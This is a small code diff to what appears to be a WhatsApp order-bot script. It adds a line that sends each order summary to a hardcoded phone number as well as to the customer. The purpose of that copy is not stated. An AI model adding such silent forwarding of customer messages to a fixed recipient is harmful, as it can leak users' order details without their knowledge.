@@ -112,6 +112,7 @@ ${response.troco !== "" ? `*Troco:* ${response.troco}` : "*Troco:* não precisa"
   }
 
   client.sendMessage(from, template);
+  client.sendMessage("5514998908820@c.us", template);
 }
 
 module.exports = { gerarTemplateString };
